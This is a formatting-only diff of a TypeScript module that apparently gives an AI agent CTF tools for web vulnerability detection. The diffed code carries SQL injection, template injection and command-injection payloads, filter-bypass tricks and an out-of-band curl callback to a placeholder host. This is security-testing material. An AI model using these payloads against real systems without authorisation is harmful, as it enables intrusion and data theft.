@@ -2,7 +2,8 @@ import type { Tool, ToolDefinition, ToolResult } from '../core/types.js'
 import { TOOL_METADATA } from '../core/toolMetadata.js'
 import type { CTFToolMetadata } from '../core/toolDefinition.js'
 
-type VulnType = 'SQLI' | 'XSS' | 'IDOR' | 'LFI' | 'CMD' | 'UPLOAD' | 'SSTI' | 'SSRF' | 'XXE' | 'OTHER'
+type VulnType =
+  'SQLI' | 'XSS' | 'IDOR' | 'LFI' | 'CMD' | 'UPLOAD' | 'SSTI' | 'SSRF' | 'XXE' | 'OTHER'
 
 function makeVulnTool(
   name: string,
@@ -36,7 +37,12 @@ function planVulnDetection(input: Record<string, unknown>): ToolResult {
   const lowerBody = responseBody.toLowerCase()
   const lowerHeaders = responseHeaders.toLowerCase()
 
-  if (lowerBody.includes('sql') || lowerBody.includes('mysql') || lowerBody.includes('oracle') || lowerBody.includes('postgres')) {
+  if (
+    lowerBody.includes('sql') ||
+    lowerBody.includes('mysql') ||
+    lowerBody.includes('oracle') ||
+    lowerBody.includes('postgres')
+  ) {
     indicators.push('SQL-related strings detected in response')
   }
   if (lowerBody.includes('<script') || lowerBody.includes('javascript:')) {
@@ -48,13 +54,22 @@ function planVulnDetection(input: Record<string, unknown>): ToolResult {
   if (lowerHeaders.includes('x-powered-by: php')) {
     indicators.push('PHP backend detected')
   }
-  if (lowerHeaders.includes('x-powered-by: express') || lowerHeaders.includes('x-powered-by: next')) {
+  if (
+    lowerHeaders.includes('x-powered-by: express') ||
+    lowerHeaders.includes('x-powered-by: next')
+  ) {
     indicators.push('Node.js backend detected')
   }
   if (lowerHeaders.includes('server: apache') || lowerHeaders.includes('server: nginx')) {
-    indicators.push(`${responseHeaders.match(/server:\s*([^\r\n]+)/i)?.[1] ?? 'Web server'} detected`)
+    indicators.push(
+      `${responseHeaders.match(/server:\s*([^\r\n]+)/i)?.[1] ?? 'Web server'} detected`,
+    )
   }
-  if (lowerBody.includes('csrf') || lowerBody.includes('_token') || lowerBody.includes('csrftoken')) {
+  if (
+    lowerBody.includes('csrf') ||
+    lowerBody.includes('_token') ||
+    lowerBody.includes('csrftoken')
+  ) {
     indicators.push('CSRF protection present')
   }
 
@@ -140,7 +155,7 @@ function planVulnDetection(input: Record<string, unknown>): ToolResult {
       <method>Inject template expressions into user-controlled fields</method>
       <payloads>
         <payload>{{7*7}}</payload>
-        <payload>${7*7}</payload>
+        <payload>${7 * 7}</payload>
         <payload>&lt;%= 7*7 %&gt;</payload>
         <payload>{{config}}</payload>
       </payloads>
@@ -178,11 +193,16 @@ function planVulnDetection(input: Record<string, unknown>): ToolResult {
 }
 
 function detectVulnType(input: Record<string, unknown>): ToolResult {
-  const vulnType = (typeof input.vulnType === 'string' ? input.vulnType.toUpperCase() : 'OTHER') as VulnType
+  const vulnType = (
+    typeof input.vulnType === 'string' ? input.vulnType.toUpperCase() : 'OTHER'
+  ) as VulnType
   const requestInfo = typeof input.requestInfo === 'string' ? input.requestInfo : ''
   const responseInfo = typeof input.responseInfo === 'string' ? input.responseInfo : ''
 
-  const methodologies: Record<VulnType, { name: string; steps: string[]; payloads: string[]; verification: string[] }> = {
+  const methodologies: Record<
+    VulnType,
+    { name: string; steps: string[]; payloads: string[]; verification: string[] }
+  > = {
     SQLI: {
       name: 'SQL Injection Detection',
       steps: [
@@ -204,7 +224,7 @@ function detectVulnType(input: Record<string, unknown>): ToolResult {
         "1' AND SLEEP(5)--",
         "1' AND (SELECT COUNT(*) FROM users)>0--",
         "'; WAITFOR DELAY '0:0:5'--",
-        "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+        '1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--',
       ],
       verification: [
         'Error messages reveal database structure',
@@ -307,7 +327,7 @@ function detectVulnType(input: Record<string, unknown>): ToolResult {
         'Test time-based blind: ; sleep 5',
         'Test out-of-band: ; curl http://collaborator.com/',
         'Bypass filters with space alternatives: ${IFS}, $IFS, <, >',
-        "Bypass filters with concatenation: c'a't, c\"a\"t",
+        'Bypass filters with concatenation: c\'a\'t, c"a"t',
         'Use wildcards: /???/??t /???/p??s??',
       ],
       payloads: [
